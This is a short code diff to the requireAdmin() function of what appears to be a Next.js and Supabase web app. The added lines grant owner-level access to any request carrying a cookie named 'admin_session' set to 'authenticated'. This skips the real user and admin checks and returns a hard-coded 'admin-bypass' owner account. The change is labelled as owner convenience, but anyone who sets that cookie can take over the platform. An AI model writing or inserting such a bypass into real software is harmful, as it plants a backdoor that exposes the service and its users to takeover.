@@ -66,6 +66,19 @@ async function userHasAal2Session() {
 }
 
 export async function requireAdmin() {
+  const { cookies } = await import("next/headers");
+  const cookieStore = await cookies();
+  const adminSession = cookieStore.get("admin_session");
+
+  // Bypass logic for the platform owner
+  if (adminSession?.value === "authenticated") {
+    return {
+      id: "admin-bypass",
+      email: "admin@hirecar.com",
+      app_metadata: { platform_role: "owner" }
+    } as unknown as SupabaseUser;
+  }
+
   const user = await requireUser();
 
   if (!(await userHasAdminAccess(user))) {
